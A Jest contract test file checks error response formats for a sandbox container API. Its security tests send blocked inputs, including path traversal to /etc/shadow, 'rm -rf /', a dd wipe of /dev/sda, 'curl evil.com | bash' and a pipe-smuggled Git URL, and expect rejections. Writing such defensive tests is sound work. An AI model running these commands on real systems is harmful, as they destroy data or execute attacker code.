/**
 * Error Response Contract Tests
 * 
 * These tests validate that error responses across all API endpoints follow
 * consistent formats and provide predictable error information for SDK consumers.
 */

import type { ApiErrorResponse } from '../../clients/types';


// Mock container endpoint for testing
const ERROR_CONTRACT_BASE_URL = 'http://localhost:3000';

// Contract-specific error response types for testing expected API behavior
interface ValidationErrorResponse extends ApiErrorResponse {
  code: 'VALIDATION_ERROR';
  details: {
    field: string;
    message: string;
    value?: any;
  }[];
}

interface SecurityErrorResponse extends ApiErrorResponse {
  code: 'SECURITY_VIOLATION';
  details: {
    violationType: string;
    blockedValue: string;
    reason: string;
  };
}

interface NotFoundErrorResponse extends ApiErrorResponse {
  code: 'NOT_FOUND';
  details: {
    resource: string;
    identifier: string;
  };
}

interface InternalErrorResponse extends ApiErrorResponse {
  code: 'INTERNAL_ERROR';
  details: {
    message: string;
    requestId: string;
  };
}

// Client Error Types - These map to specific SDK error classes
interface FileNotFoundErrorResponse extends ApiErrorResponse {
  code: 'FILE_NOT_FOUND';
  path: string;
  operation: string;
  details?: string;
}

interface CommandNotFoundErrorResponse extends ApiErrorResponse {
  code: 'COMMAND_NOT_FOUND';
  command: string;
  details?: string;
}

interface ProcessNotFoundErrorResponse extends ApiErrorResponse {
  code: 'PROCESS_NOT_FOUND';
  processId: string;
  details?: string;
}

interface PortAlreadyExposedErrorResponse extends ApiErrorResponse {
  code: 'PORT_ALREADY_EXPOSED';
  port: number;
  details?: string;
}

interface PortNotExposedErrorResponse extends ApiErrorResponse {
  code: 'PORT_NOT_EXPOSED';
  port: number;
  details?: string;
}

interface InvalidPortErrorResponse extends ApiErrorResponse {
  code: 'INVALID_PORT';
  port: number;
  details?: string;
}

interface GitRepositoryNotFoundErrorResponse extends ApiErrorResponse {
  code: 'GIT_REPOSITORY_NOT_FOUND';
  repoUrl: string;
  details?: string;
}

interface GitAuthenticationErrorResponse extends ApiErrorResponse {
  code: 'GIT_AUTHENTICATION_ERROR';
  repoUrl: string;
  details?: string;
}

describe('Error Response Contract Validation', () => {
  describe('Validation Error Contracts', () => {
    it('should return ValidationErrorResponse for missing required fields', async () => {
      const testCases = [
        {
          endpoint: '/api/execute',
          method: 'POST',
          body: JSON.stringify({}), // Missing command
          expectedField: 'command'
        },
        {
          endpoint: '/api/files/read',
          method: 'POST',
          body: JSON.stringify({}), // Missing path
          expectedField: 'path'
        },
        {
          endpoint: '/api/files/write',
          method: 'POST',
          body: JSON.stringify({ path: '/tmp/test.txt' }), // Missing content
          expectedField: 'content'
        },
        {
          endpoint: '/api/processes/start',
          method: 'POST',
          body: JSON.stringify({}), // Missing command
          expectedField: 'command'
        },
        {
          endpoint: '/api/ports/expose',
          method: 'POST',
          body: JSON.stringify({}), // Missing port
          expectedField: 'port'
        },
        {
          endpoint: '/api/git/checkout',
          method: 'POST',
          body: JSON.stringify({}), // Missing repoUrl
          expectedField: 'repoUrl'
        }
      ];

      for (const testCase of testCases) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}${testCase.endpoint}`, {
          method: testCase.method,
          headers: { 'Content-Type': 'application/json' },
          body: testCase.body
        });

        expect(response.status).toBe(400);
        
        const data: ValidationErrorResponse = await response.json();
        
        // Validate ValidationErrorResponse contract
        expect(data.success).toBe(false);
        expect(data.code).toBe('VALIDATION_ERROR');
        expect(data).toHaveProperty('error');
        expect(data).toHaveProperty('details');
        expect(Array.isArray(data.details)).toBe(true);
        expect(data.details.length).toBeGreaterThan(0);
        
        // Validate validation detail structure
        const fieldError = data.details.find(d => d.field === testCase.expectedField);
        expect(fieldError).toBeDefined();
        expect(fieldError!.field).toBe(testCase.expectedField);
        expect(typeof fieldError!.message).toBe('string');
        expect(fieldError!.message.length).toBeGreaterThan(0);
      }
    });

    it('should return ValidationErrorResponse for invalid field types', async () => {
      const testCases = [
        {
          endpoint: '/api/execute',
          body: JSON.stringify({ command: 123 }), // command should be string
          expectedField: 'command'
        },
        {
          endpoint: '/api/files/write',
          body: JSON.stringify({ path: '/tmp/test.txt', content: {} }), // content should be string
          expectedField: 'content'
        },
        {
          endpoint: '/api/ports/expose',
          body: JSON.stringify({ port: 'invalid' }), // port should be number
          expectedField: 'port'
        },
        {
          endpoint: '/api/processes/start',
          body: JSON.stringify({ command: 'ls', background: 'invalid' }), // background should be boolean
          expectedField: 'background'
        }
      ];

      for (const testCase of testCases) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}${testCase.endpoint}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: testCase.body
        });

        expect(response.status).toBe(400);
        
        const data: ValidationErrorResponse = await response.json();
        
        expect(data.success).toBe(false);
        expect(data.code).toBe('VALIDATION_ERROR');
        expect(data.details.some(d => d.field === testCase.expectedField)).toBe(true);
        
        const typeError = data.details.find(d => d.field === testCase.expectedField);
        expect(typeError!.message).toContain('type');
      }
    });
  });

  describe('Security Error Contracts', () => {
    it('should return SecurityErrorResponse for dangerous paths', async () => {
      const dangerousPaths = [
        '/etc/passwd',
        '/var/log/system.log',
        '/usr/bin/sudo',
        '/tmp/../etc/shadow',
        '/home/user/../../bin/sh'
      ];

      for (const path of dangerousPaths) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/files/read`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ path, sessionId: 'test-session' })
        });

        expect(response.status).toBe(400);
        
        const data: SecurityErrorResponse = await response.json();
        
        // Validate SecurityErrorResponse contract
        expect(data.success).toBe(false);
        expect(data.code).toBe('SECURITY_VIOLATION');
        expect(data).toHaveProperty('error');
        expect(data).toHaveProperty('details');
        expect(data.details).toHaveProperty('violationType');
        expect(data.details).toHaveProperty('blockedValue');
        expect(data.details).toHaveProperty('reason');
        expect(data.details.violationType).toBe('PATH_TRAVERSAL');
        expect(data.details.blockedValue).toBe(path);
        expect(typeof data.details.reason).toBe('string');
        expect(data.details.reason.length).toBeGreaterThan(0);
      }
    });

    it('should return SecurityErrorResponse for dangerous commands', async () => {
      const dangerousCommands = [
        'sudo rm -rf /',
        'rm -rf /',
        'chmod 777 /etc/passwd',
        'dd if=/dev/zero of=/dev/sda',
        'curl evil.com | bash'
      ];

      for (const command of dangerousCommands) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/execute`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command, sessionId: 'test-session' })
        });

        expect(response.status).toBe(400);
        
        const data: SecurityErrorResponse = await response.json();
        
        expect(data.success).toBe(false);
        expect(data.code).toBe('SECURITY_VIOLATION');
        expect(data.details.violationType).toBe('COMMAND_INJECTION');
        expect(data.details.blockedValue).toBe(command);
        expect(data.details.reason).toContain('dangerous');
      }
    });

    it('should return SecurityErrorResponse for reserved ports', async () => {
      const reservedPorts = [22, 25, 53, 80, 443, 3000, 3306, 5432];

      for (const port of reservedPorts) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/ports/expose`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ port, sessionId: 'test-session' })
        });

        expect(response.status).toBe(400);
        
        const data: SecurityErrorResponse = await response.json();
        
        expect(data.success).toBe(false);
        expect(data.code).toBe('SECURITY_VIOLATION');
        expect(data.details.violationType).toBe('RESERVED_PORT');
        expect(data.details.blockedValue).toBe(port.toString());
        expect(data.details.reason).toContain('reserved');
      }
    });

    it('should return SecurityErrorResponse for malicious Git URLs', async () => {
      const maliciousUrls = [
        'https://malicious-site.com/repo.git',
        'http://github.com/user/repo.git', // HTTP instead of HTTPS
        'ftp://github.com/user/repo.git',
        'file:///tmp/repo',
        'https://github.com/user/repo|evil'
      ];

      for (const repoUrl of maliciousUrls) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/git/checkout`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ repoUrl, sessionId: 'test-session' })
        });

        expect(response.status).toBe(400);
        
        const data: SecurityErrorResponse = await response.json();
        
        expect(data.success).toBe(false);
        expect(data.code).toBe('SECURITY_VIOLATION');
        expect(data.details.violationType).toBe('MALICIOUS_URL');
        expect(data.details.blockedValue).toBe(repoUrl);
        expect(data.details.reason).toContain('trusted');
      }
    });
  });

  describe('Not Found Error Contracts', () => {
    it('should return NotFoundErrorResponse for nonexistent files', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/files/read`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          path: '/tmp/nonexistent-file-12345.txt',
          sessionId: 'test-session'
        })
      });

      expect(response.status).toBe(404);
      
      const data: NotFoundErrorResponse = await response.json();
      
      // Validate NotFoundErrorResponse contract
      expect(data.success).toBe(false);
      expect(data.code).toBe('NOT_FOUND');
      expect(data).toHaveProperty('error');
      expect(data).toHaveProperty('details');
      expect(data.details).toHaveProperty('resource');
      expect(data.details).toHaveProperty('identifier');
      expect(data.details.resource).toBe('file');
      expect(data.details.identifier).toBe('/tmp/nonexistent-file-12345.txt');
    });

    it('should return NotFoundErrorResponse for nonexistent processes', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/processes/nonexistent-process-123/stop`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: 'test-session' })
      });

      expect(response.status).toBe(404);
      
      const data: NotFoundErrorResponse = await response.json();
      
      expect(data.success).toBe(false);
      expect(data.code).toBe('NOT_FOUND');
      expect(data.details.resource).toBe('process');
      expect(data.details.identifier).toBe('nonexistent-process-123');
    });

    it('should return NotFoundErrorResponse for nonexistent sessions', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/sessions/nonexistent-session-123`, {
        method: 'DELETE'
      });

      expect(response.status).toBe(404);
      
      const data: NotFoundErrorResponse = await response.json();
      
      expect(data.success).toBe(false);
      expect(data.code).toBe('NOT_FOUND');
      expect(data.details.resource).toBe('session');
      expect(data.details.identifier).toBe('nonexistent-session-123');
    });

    it('should return NotFoundErrorResponse for invalid endpoints', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/nonexistent-endpoint`, {
        method: 'GET'
      });

      expect(response.status).toBe(404);
      
      const data: NotFoundErrorResponse = await response.json();
      
      expect(data.success).toBe(false);
      expect(data.code).toBe('NOT_FOUND');
      expect(data.details.resource).toBe('endpoint');
      expect(data.details.identifier).toBe('/api/nonexistent-endpoint');
    });
  });

  describe('Internal Error Contracts', () => {
    it('should return InternalErrorResponse for server failures', async () => {
      // This test simulates server-side failures that might occur
      // In a real scenario, this would be tested by inducing specific failure conditions
      
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/execute`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Simulate-Error': 'internal' // Custom header to trigger test error
        },
        body: JSON.stringify({
          command: 'echo "test"',
          sessionId: 'test-session'
        })
      });

      // Only test this if the server supports error simulation
      if (response.status === 500) {
        const data: InternalErrorResponse = await response.json();
        
        // Validate InternalErrorResponse contract
        expect(data.success).toBe(false);
        expect(data.code).toBe('INTERNAL_ERROR');
        expect(data).toHaveProperty('error');
        expect(data).toHaveProperty('details');
        expect(data.details).toHaveProperty('message');
        expect(data.details).toHaveProperty('requestId');
        expect(typeof data.details.message).toBe('string');
        expect(typeof data.details.requestId).toBe('string');
        expect(data.details.requestId.length).toBeGreaterThan(0);
      }
    });

    it('should return InternalErrorResponse for database connection failures', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/sessions`, {
        method: 'GET',
        headers: { 
          'X-Simulate-Error': 'database' // Simulate database failure
        }
      });

      if (response.status === 500) {
        const data: InternalErrorResponse = await response.json();
        
        expect(data.success).toBe(false);
        expect(data.code).toBe('INTERNAL_ERROR');
        expect(data.details.message).toContain('database');
      }
    });
  });

  describe('Error Response Consistency', () => {
    it('should include consistent fields across all error types', async () => {
      const errorEndpoints = [
        { url: '/api/execute', method: 'POST', body: JSON.stringify({}) },
        { url: '/api/files/read', method: 'POST', body: JSON.stringify({ path: '/etc/passwd' }) },
        { url: '/api/ports/expose', method: 'POST', body: JSON.stringify({ port: 22 }) },
        { url: '/api/nonexistent', method: 'GET', body: undefined }
      ];

      for (const endpoint of errorEndpoints) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}${endpoint.url}`, {
          method: endpoint.method,
          headers: endpoint.body ? { 'Content-Type': 'application/json' } : {},
          body: endpoint.body
        });

        expect([400, 404, 500]).toContain(response.status);
        
        const data: ApiErrorResponse = await response.json();
        
        // All error responses should have these consistent fields
        expect(data).toHaveProperty('success');
        expect(data).toHaveProperty('error');
        expect(data.success).toBe(false);
        expect(typeof data.error).toBe('string');
        expect(data.error.length).toBeGreaterThan(0);

        // Optional but recommended fields
        if (data.timestamp) {
          expect(typeof data.timestamp).toBe('string');
          expect(data.timestamp).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/);
        }
        
        if (data.code) {
          expect(typeof data.code).toBe('string');
          expect(['VALIDATION_ERROR', 'SECURITY_VIOLATION', 'NOT_FOUND', 'INTERNAL_ERROR']).toContain(data.code);
        }
      }
    });

    it('should include proper CORS headers in error responses', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({}) // Invalid request
      });

      expect(response.status).toBe(400);
      
      // Error responses should still include CORS headers
      expect(response.headers.get('Access-Control-Allow-Origin')).toBe('*');
      expect(response.headers.get('Access-Control-Allow-Methods')).toContain('POST');
      expect(response.headers.get('Access-Control-Allow-Headers')).toContain('Content-Type');
    });

    it('should return proper Content-Type for error responses', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/files/read`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ path: '/etc/passwd' })
      });

      expect(response.status).toBe(400);
      expect(response.headers.get('Content-Type')).toContain('application/json');
    });
  });

  describe('Client Error Type Contracts', () => {
    it('should return FileNotFoundError format for missing files', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/read`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          path: '/tmp/nonexistent-file-12345.txt',
          sessionId: 'test-session'
        })
      });

      expect(response.status).toBe(404);
      
      const data: FileNotFoundErrorResponse = await response.json();
      
      // Validate FileNotFoundErrorResponse contract
      expect(data.success).toBe(false);
      expect(data.code).toBe('FILE_NOT_FOUND');
      expect(data).toHaveProperty('error');
      expect(data).toHaveProperty('path');
      expect(data).toHaveProperty('operation');
      expect(data.path).toBe('/tmp/nonexistent-file-12345.txt');
      expect(data.operation).toBe('FILE_READ');
      expect(data.error).toContain('file');
      expect(data.error).toContain('not found');
    });

    it('should return CommandNotFoundError format for invalid commands', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          command: 'definitely-not-a-real-command-12345',
          sessionId: 'test-session'
        })
      });

      expect(response.status).toBe(404);
      
      const data: CommandNotFoundErrorResponse = await response.json();
      
      // Validate CommandNotFoundErrorResponse contract
      expect(data.success).toBe(false);
      expect(data.code).toBe('COMMAND_NOT_FOUND');
      expect(data).toHaveProperty('error');
      expect(data).toHaveProperty('command');
      expect(data.command).toBe('definitely-not-a-real-command-12345');
      expect(data.error).toContain('command');
      expect(data.error).toContain('not found');
    });

    it('should return ProcessNotFoundError format for invalid process IDs', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/process/nonexistent-process-12345`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' }
      });

      expect(response.status).toBe(404);
      
      const data: ProcessNotFoundErrorResponse = await response.json();
      
      // Validate ProcessNotFoundErrorResponse contract
      expect(data.success).toBe(false);
      expect(data.code).toBe('PROCESS_NOT_FOUND');
      expect(data).toHaveProperty('error');
      expect(data).toHaveProperty('processId');
      expect(data.processId).toBe('nonexistent-process-12345');
      expect(data.error).toContain('process');
      expect(data.error).toContain('not found');
    });

    it('should return PortAlreadyExposedError format for duplicate port exposures', async () => {
      // First, expose a port
      const exposeResponse = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/expose-port`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          port: 8888,
          sessionId: 'test-session'
        })
      });

      if (exposeResponse.ok) {
        // Try to expose the same port again
        const duplicateResponse = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/expose-port`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            port: 8888,
            sessionId: 'test-session'
          })
        });

        expect(duplicateResponse.status).toBe(409);
        
        const data: PortAlreadyExposedErrorResponse = await duplicateResponse.json();
        
        // Validate PortAlreadyExposedErrorResponse contract
        expect(data.success).toBe(false);
        expect(data.code).toBe('PORT_ALREADY_EXPOSED');
        expect(data).toHaveProperty('error');
        expect(data).toHaveProperty('port');
        expect(data.port).toBe(8888);
        expect(data.error).toContain('port');
        expect(data.error).toContain('already exposed');

        // Clean up
        await fetch(`${ERROR_CONTRACT_BASE_URL}/api/exposed-ports/8888`, {
          method: 'DELETE'
        });
      }
    });

    it('should return PortNotExposedError format for unexposing non-exposed ports', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/exposed-ports/9999`, {
        method: 'DELETE'
      });

      expect(response.status).toBe(404);
      
      const data: PortNotExposedErrorResponse = await response.json();
      
      // Validate PortNotExposedErrorResponse contract
      expect(data.success).toBe(false);
      expect(data.code).toBe('PORT_NOT_EXPOSED');
      expect(data).toHaveProperty('error');
      expect(data).toHaveProperty('port');
      expect(data.port).toBe(9999);
      expect(data.error).toContain('port');
      expect(data.error).toContain('not exposed');
    });

    it('should return InvalidPortError format for invalid port numbers', async () => {
      const invalidPorts = [-1, 0, 99999, 65536, 'invalid'];
      
      for (const port of invalidPorts) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/expose-port`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            port: port,
            sessionId: 'test-session'
          })
        });

        expect(response.status).toBe(400);
        
        const data: InvalidPortErrorResponse = await response.json();
        
        // Validate InvalidPortErrorResponse contract
        expect(data.success).toBe(false);
        expect(data.code).toBe('INVALID_PORT');
        expect(data).toHaveProperty('error');
        expect(data).toHaveProperty('port');
        expect(data.port).toBe(typeof port === 'number' ? port : NaN);
        expect(data.error).toContain('port');
        expect(data.error).toContain('invalid');
      }
    });

    it('should return GitRepositoryNotFoundError format for invalid repositories', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/git/checkout`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          repoUrl: 'https://github.com/definitely/does-not-exist-repo-12345.git',
          targetDir: '/tmp/fake-repo',
          sessionId: 'test-session'
        })
      });

      expect(response.status).toBe(404);
      
      const data: GitRepositoryNotFoundErrorResponse = await response.json();
      
      // Validate GitRepositoryNotFoundErrorResponse contract
      expect(data.success).toBe(false);
      expect(data.code).toBe('GIT_REPOSITORY_NOT_FOUND');
      expect(data).toHaveProperty('error');
      expect(data).toHaveProperty('repoUrl');
      expect(data.repoUrl).toBe('https://github.com/definitely/does-not-exist-repo-12345.git');
      expect(data.error).toContain('repository');
      expect(data.error).toContain('not found');
    });

    it('should return GitAuthenticationError format for private repositories', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/git/checkout`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          repoUrl: 'https://github.com/private/some-private-repo.git',
          targetDir: '/tmp/private-test',
          sessionId: 'test-session'
        })
      });

      // This could be 401 (authentication required) or 403 (forbidden)
      expect([401, 403]).toContain(response.status);
      
      const data: GitAuthenticationErrorResponse = await response.json();
      
      // Validate GitAuthenticationErrorResponse contract
      expect(data.success).toBe(false);
      expect(data.code).toBe('GIT_AUTHENTICATION_ERROR');
      expect(data).toHaveProperty('error');
      expect(data).toHaveProperty('repoUrl');
      expect(data.repoUrl).toBe('https://github.com/private/some-private-repo.git');
      expect(data.error).toContain('authentication');
    });

    it('should maintain consistent error structure across all client error types', async () => {
      const clientErrorTests = [
        {
          name: 'FileNotFoundError',
          request: {
            url: '/api/read',
            method: 'POST',
            body: JSON.stringify({
              path: '/tmp/missing-file.txt',
              sessionId: 'test-session'
            })
          },
          expectedCode: 'FILE_NOT_FOUND',
          expectedStatus: 404
        },
        {
          name: 'CommandNotFoundError',
          request: {
            url: '/api/execute',
            method: 'POST',
            body: JSON.stringify({
              command: 'missing-command-xyz',
              sessionId: 'test-session'
            })
          },
          expectedCode: 'COMMAND_NOT_FOUND',
          expectedStatus: 404
        },
        {
          name: 'ProcessNotFoundError',
          request: {
            url: '/api/process/missing-process-123',
            method: 'GET',
            body: undefined
          },
          expectedCode: 'PROCESS_NOT_FOUND',
          expectedStatus: 404
        }
      ];

      for (const test of clientErrorTests) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}${test.request.url}`, {
          method: test.request.method,
          headers: test.request.body ? { 'Content-Type': 'application/json' } : {},
          body: test.request.body
        });

        expect(response.status).toBe(test.expectedStatus);
        
        const data: ApiErrorResponse = await response.json();
        
        // All client error types should have consistent base structure
        expect(data.success).toBe(false);
        expect(data.code).toBe(test.expectedCode);
        expect(data).toHaveProperty('error');
        expect(typeof data.error).toBe('string');
        expect(data.error.length).toBeGreaterThan(0);
        
        // Should include timestamp for tracking
        if (data.timestamp) {
          expect(typeof data.timestamp).toBe('string');
        }
      }
    });
  });

  describe('Error Message Quality', () => {
    it('should provide actionable error messages', async () => {
      const testCases = [
        {
          endpoint: '/api/execute',
          body: JSON.stringify({}),
          expectedMessageContent: ['command', 'required']
        },
        {
          endpoint: '/api/files/read',
          body: JSON.stringify({ path: '/etc/passwd' }),
          expectedMessageContent: ['path', 'dangerous', 'allowed']
        },
        {
          endpoint: '/api/ports/expose',
          body: JSON.stringify({ port: 22 }),
          expectedMessageContent: ['port', 'reserved', 'range']
        }
      ];

      for (const testCase of testCases) {
        const response = await fetch(`${ERROR_CONTRACT_BASE_URL}${testCase.endpoint}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: testCase.body
        });

        const data: ApiErrorResponse = await response.json();
        
        const errorMessage = data.error.toLowerCase();
        const hasExpectedContent = testCase.expectedMessageContent.some(content => 
          errorMessage.includes(content.toLowerCase())
        );
        
        expect(hasExpectedContent).toBe(true);
        expect(errorMessage.length).toBeGreaterThan(10); // Should be descriptive
        expect(errorMessage).not.toContain('undefined');
        expect(errorMessage).not.toContain('null');
      }
    });

    it('should not expose internal implementation details in error messages', async () => {
      const response = await fetch(`${ERROR_CONTRACT_BASE_URL}/api/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: 'invalid-command-that-might-expose-internals' })
      });

      const data: ApiErrorResponse = await response.json();
      
      // Error messages should not expose internal details
      const sensitiveTerms = [
        'stack trace',
        'internal error',
        'database',
        'sql',
        'connection string',
        'file path',
        'server error',
        'exception'
      ];
      
      const errorMessage = data.error.toLowerCase();
      for (const term of sensitiveTerms) {
        expect(errorMessage).not.toContain(term);
      }
    });
  });
});

/**
 * These Error Response Contract tests are CRITICAL for ensuring consistent
 * error handling across the entire API surface. They validate:
 * 
 * 1. **Error Type Consistency**: All error types follow consistent response formats
 * 2. **Validation Error Contracts**: Field validation errors provide actionable information
 * 3. **Security Error Contracts**: Security violations are reported with proper context
 * 4. **Not Found Error Contracts**: Resource not found errors identify the missing resource
 * 5. **Internal Error Contracts**: Server errors provide appropriate debugging information
 * 6. **Error Message Quality**: Error messages are actionable and don't expose internals
 * 7. **HTTP Status Code Consistency**: Proper status codes for different error types
 * 8. **CORS Header Inclusion**: Error responses include proper CORS headers
 * 9. **Content Type Consistency**: All errors return JSON with proper content-type
 * 10. **Field Presence Validation**: Required error fields are always present
 * 
 * These contracts ensure that SDK consumers can rely on consistent error handling
 * patterns across all endpoints. They prevent regressions in error response formats
 * that could break error handling logic in consumer applications.
 * 
 * If these tests fail, it indicates that error response formats have changed in a
 * way that could break consumer error handling. Such changes require careful
 * consideration and potentially backwards compatibility measures.
 */